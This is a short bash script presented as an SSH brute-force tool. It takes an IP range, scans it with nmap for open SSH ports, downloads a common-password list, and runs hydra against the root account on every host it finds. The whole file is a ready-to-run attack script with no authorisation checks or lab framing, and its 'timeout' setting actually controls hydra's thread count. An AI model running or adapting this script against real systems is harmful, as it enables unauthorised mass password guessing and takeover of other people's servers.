#!/bin/bash

# Script Name: scanner.sh
# Description: SSH Brute Force Tool by SleepTheGod
# Author: SleepTheGod

echo "SSH Brute Force Tool by SleepTheGod"

# Default values
SSH_PORT=22
TIMEOUT=5
USER_LIST="root"
PASS_LIST_URL="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt"
PASS_LIST="10k-most-common.txt"

# Function to download the password list
download_password_list() {
    if [ ! -f "$PASS_LIST" ]; then
        echo "Downloading password list..."
        curl -o "$PASS_LIST" "$PASS_LIST_URL"
        if [ $? -ne 0 ]; then
            echo "Failed to download password list."
            exit 1
        fi
    fi
}

# Usage function
usage() {
    echo "Usage: $0 <IP range>"
    echo "Optional parameters:"
    echo "  -p <port>                SSH port (default: 22)"
    echo "  -t <timeout>             Timeout in seconds (default: 5)"
    echo "  -h, --help               Display this help message"
    exit 1
}

# Check if necessary tools are installed
if ! command -v hydra &> /dev/null; then
    echo "hydra could not be found, please install it to use this script."
    exit 1
fi

if ! command -v nmap &> /dev/null; then
    echo "nmap could not be found, please install it to use this script."
    exit 1
fi

# Parse command-line options
while getopts ":p:t:h" opt; do
  case ${opt} in
    p )
      SSH_PORT=$OPTARG
      ;;
    t )
      TIMEOUT=$OPTARG
      ;;
    h )
      usage
      ;;
    \? )
      echo "Invalid option: -$OPTARG" 1>&2
      usage
      ;;
    : )
      echo "Invalid option: -$OPTARG requires an argument" 1>&2
      usage
      ;;
  esac
done
shift $((OPTIND -1))

# Check if IP range is provided
if [ -z "$1" ]; then
    usage
fi
IP_RANGE="$1"

# Download the password list
download_password_list

# Scan the IP range for open SSH ports
echo "Scanning IP range $IP_RANGE for open SSH ports..."
open_hosts=$(nmap -p $SSH_PORT --open -oG - $IP_RANGE | awk '/Up$/{print $2}')

# Run Hydra on each open host
for target in $open_hosts; do
    echo "Starting brute-force attack on $target..."
    hydra -t $TIMEOUT -V -f -l $USER_LIST -P $PASS_LIST -s $SSH_PORT ssh://$target
done
